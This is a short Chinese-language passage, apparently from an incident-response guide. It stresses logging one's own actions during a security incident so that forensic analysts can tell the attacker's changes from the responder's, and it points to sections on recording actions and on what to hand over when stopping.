> 沒有它，專業人員無法區分哪些改動是攻擊者造成的、哪些是你造成的，
> 整份證據的判讀價值會大幅下降，甚至可能導致錯誤結論。
> → 見「記錄你自己做的每一件事」與「停手時要交出什麼」。★★★★★
